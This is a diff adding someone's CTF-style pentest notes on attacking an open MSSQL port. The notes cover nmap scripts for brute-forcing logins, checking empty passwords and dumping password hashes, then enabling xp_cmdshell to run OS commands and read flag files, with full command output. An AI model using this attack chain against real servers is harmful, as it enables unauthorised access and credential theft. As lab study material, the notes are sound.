@@ -1,1 +1,296 @@
-# hello world
+# so you found an MSSQL port open, huh?
+
+#### NMAP ####
+# general, sweeping recon
+
+$ nmap -p1433 --script ms-sql-info $target_ip
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+
+Host script results:
+| ms-sql-info: 
+|   10.4.19.227:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+
+# banner, nice.  Server info, nice.
+
+# Get domain info, if you can
+# see here:   https://nmap.org/nsedoc/scripts/ms-sql-ntlm-info.html
+# TL;DR 
+# Sending a MS-TDS NTLM authentication request with an invalid domain 
+# and null credentials will cause the remote service to respond with an 
+# NTLMSSP message disclosing information to include NetBIOS, DNS, and OS build version
+
+$ nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 $target
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-22 01:03 IST
+Nmap scan report for 10.4.19.227
+Host is up (0.0091s latency).
+
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+| ms-sql-ntlm-info: 
+|   Target_Name: MSSQL-SERVER
+|   NetBIOS_Domain_Name: MSSQL-SERVER
+|   NetBIOS_Computer_Name: MSSQL-SERVER
+|   DNS_Domain_Name: MSSQL-Server
+|   DNS_Computer_Name: MSSQL-Server
+|_  Product_Version: 10.0.14393
+
+# don't call it a bruteforce ... 
+# Identifying valid MSSQL users and their passwords using provided username and password list.
+
+$ nmap -p1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt $target
+
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+| ms-sql-brute: 
+|   [10.8.16.127:1433]
+|     Credentials found:
+|       admin:maria => Login Success
+|       dbadmin:buddy => Login Success
+|_      auditor:comeback => Login Success
+
+# just in case someone forgot to kick the tires
+# check for empty passwords
+
+$ nmap -p 1433 --script ms-sql-empty-password $target
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-22 01:10 IST
+Nmap scan report for 10.4.19.227
+Host is up (0.0088s latency).
+
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+| ms-sql-empty-password: 
+|   [10.4.19.227:1433]
+|_    sa:<empty> => Login Success
+
+
+# taking what we learned just above and runing a query 
+# this gave me some good ideas: https://d00mfist.gitbooks.io/ctf/content/sql-injections.html
+# TO DO: get (A LOT) better at queries and injections
+
+$ nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=maria,ms-sql-query.query="SELECT * FROM master..syslogins" $target -oN output.txt
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-22 01:12 IST
+Nmap scan report for 10.4.19.227
+Host is up (0.0088s latency).
+
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+| ms-sql-query: 
+|   (Use --script-args=ms-sql-query.query='<QUERY>' to change query.)
+|   [10.4.19.227:1433]
+|     Query: SELECT @@version version
+|       version
+|       =======
+|       Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
+|       	Sep 24 2019 13:48:23 
+|       	Copyright (C) 2019 Microsoft Corporation
+|_      	Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)
+
+# view with text editor
+
+# go big, get hashes 
+
+$ nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=maria $target
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-22 01:17 IST
+Nmap scan report for 10.4.19.227
+Host is up (0.0094s latency).
+
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+| ms-sql-dump-hashes: 
+| [10.4.19.227:1433]
+|     sa:0x020011dbfaf35ba0d5e61a769e3604230fde23e5d3e01e7ff0ba3875cf75554803e2f1e1977b78de8f4489c95df9be979c02f1dec551300c109c408c427934815755b600c7e0
+|     ##MS_PolicyEventProcessingLogin##:0x0200191cf079f310fb475527ac320aba7a4e8d5c3567bef2462b96ce8a8629b7f986ed344aa0963ac3a096da77056dad77a457644431282e2aa2c2243bc635abc6bb5f52552c
+|     ##MS_PolicyTsqlExecutionLogin##:0x0200677385acfe08bb1119246cf20f9d17c3a0d86bbb1d48874725f2c2e0e021260b885d0ba067427e09afad9079e6759ad6497ee7f1ef3cd497d500585d7727eeba64426083
+|     admin:0x02003814edd67dcab815b733d877a0fe7ec3470185864bd673c7273ba76c31e000c15e9fae25a826f6ba03892e37d6a1acae17f171d21dad7b20d874ccc259bbf9fa2230b9c0
+|     Mssql:0x02001786154bb350ac708b5a4c3fc6b90dc68418a13ba5fcb76b155f8eee14d72988edb559d9a2d0d6fd5dd25b1fab8431c0ca424d747a5743624c30aa772b40c8f23c66e6a4
+|     Mssqla:0x0200987f06858112a7fa0c70fe3f53c64061b35ae864782fc9cfcda3954ed60ca7e47e8497a571d177edb596f125cb529d7b2753e4d8e913c2b127a12207e3bcb75f70e29cb5
+|     auditor:0x020061cbe8509dfea47fbc20be854c4ac517bf6aa67f9f7c12d7d1efb1f500be279643c6cd19d370f9eff4f2d9b981a16f6916bc4534e8ba42d718f8b908fbfffb40d5cc1a5e
+|_    dbadmin:0x02000d6c6a0d55f536f9dbff2d8cc1e0965c550e1a1a1e7c6df8b7e6534ab817408f86dd9592b206862c4b7a3d1f6ca85f439360171d7c5143d6fba8606675dbaf5bea40d15b
+
+# execute command shell
+
+$ nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" $target
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-22 01:24 IST
+Nmap scan report for 10.4.19.227
+Host is up (0.0088s latency).
+
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+| ms-sql-xp-cmdshell: 
+|   [10.4.19.227:1433]
+|     Command: ipconfig
+|       output
+|       ======
+|       Null
+|       Windows IP Configuration
+|       Null
+|       Null
+|       Ethernet adapter Ethernet:
+|       Null
+|          Connection-specific DNS Suffix  . : ec2.internal
+|          Link-local IPv6 Address . . . . . : fe80::5197:d908:db3:810e%3
+|          IPv4 Address. . . . . . . . . . . : 10.4.19.227
+|          Subnet Mask . . . . . . . . . . . : 255.255.240.0
+|          Default Gateway . . . . . . . . . : 10.4.16.1
+...
+# you get the picture
+
+# for CTF purposes, read the flag
+
+$ nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type C:\flag.txt" $target
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-22 01:26 IST
+Nmap scan report for 10.4.19.227
+Host is up (0.0089s latency).
+
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+| ms-sql-xp-cmdshell: 
+|   [10.4.19.227:1433]
+|     Command: type C:\flag.txt
+|       output
+|       ======
+|_      145a5180357028b2154a6201d464f324
+
+#### MSFCONSOLE ####
+
+auxiliary/scanner/mssql/mssql_login
+
+use auxiliary/admin/mssql/mssql_enum
+
+use auxiliary/admin/mssql/mssql_enum_sql_logins
+
+use auxiliary/admin/mssql/mssql_exec
+
+use auxiliary/admin/mssql/mssql_enum_domain_accounts
+
+#### CLI TOOLS ####
+
+# grab some general info through a pyhon3 module
+
+$ python3 -m mssqlcli.main -S 10.4.24.220 -U sa -P sweetness
+
+# get version information
+
+master> select @@version;   
+| Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
+        Sep 24 2019 13:48:23 
+        Copyright (C) 2019 Microsoft Corporation
+        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)
+
+# get machine hostname
+
+master> select host_name();                                                                                                                            
+Time: 0.452s
++--------------------+
+| (No column name)   |
+|--------------------|
+| attackdefense      |
++--------------------+
+
+# locate sysadmin level users
+
+master> select loginname from syslogins where sysadmin = 1;                                                                                           
+Time: 0.452s
++-------------------------------+
+| loginname                     |
+|-------------------------------|
+| sa                            |
+| EC2AMAZ-5861GL6\Administrator |
+| NT SERVICE\SQLWriter          |
+| NT SERVICE\Winmgmt            |
+| NT Service\MSSQL$SQLEXPRESS   |
+| dbadmin                       |
+| admin                         |
++-------------------------------+
+
+master> select * from sysusers;                                                                                                                       
+Time: 0.452s
+
+master> select name,password_hash FROM master.sys.sql_logins;                                                                                          
+Time: 0.452s
+
+# check for xp_cmdshell if installed
+## earlier you recall we found the 'sa' user in the list of sysusers
+## Because we are running as a sys privilege and hence we can modify and enable xp_cmdshell!
+
+master> SELECT name, CONVERT(INT,ISNULL(value,value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';                        
+Time: 0.452s
++-------------+----------------+
+| name        | IsConfigured   |
+|-------------+----------------|
+| xp_cmdshell | 0              |
++-------------+----------------+
+
+# Enable xp_cmdshell
+
+master>  EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE
+
+master> SELECT name, CONVERT(INT, ISNULL(value,value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';                       
+Time: 0.452s
++-------------+----------------+
+| name        | IsConfigured   |
+|-------------+----------------|
+| xp_cmdshell | 1              |
++-------------+----------------+
+
+# Execute stuff
+
+master> EXEC xp_cmdshell "whoami";                                                                                                                    
+Time: 0.502s
++-----------------------------+
+| output                      |
+|-----------------------------|
+| nt service\mssql$sqlexpress |
+| NULL                        |
++-----------------------------+
+
+master> EXEC xp_cmdshell "echo %cd%"                                                                                                                  
+Time: 1.303s (a second)
++---------------------+
+| output              |
+|---------------------|
+| C:\Windows\system32 |
+| NULL                |
++---------------------+
+
+master> EXEC xp_cmdshell "dir C:\"                                                                                                                    
+Time: 0.452s
++------------------------------------------------------------+
+| output                                                     |
+|------------------------------------------------------------|
+|  Volume in drive C has no label.                           |
+|  Volume Serial Number is 147C-E1FD                         |
+|  Directory of C:\                                          |
+| 01/20/2021  11:06 AM                32 flag.txt            |
+| 02/23/2018  11:06 AM    <DIR>          PerfLogs            |
+| 03/25/2021  05:11 AM    <DIR>          Program Files       |
+| 03/25/2021  05:11 AM    <DIR>          Program Files (x86) |
+| 01/20/2021  07:17 AM    <DIR>          Users               |
+| 01/20/2021  09:33 AM    <DIR>          Windows             |
+...
+|                5 Dir(s)  13,956,489,216 bytes free         |
+| NULL                                                       |
++------------------------------------------------------------+
+(14 rows affected)
+
+master> EXEC xp_cmdshell "type C:\flag.txt";                                                                                                          
+Time: 0.452s
++----------------------------------+
+| output                           |
+|----------------------------------|
+| 8ca7d051749cd5d3e1e741ef9c5b7da1 |
++----------------------------------+
+(1 row affected)
+
+
+
+
+
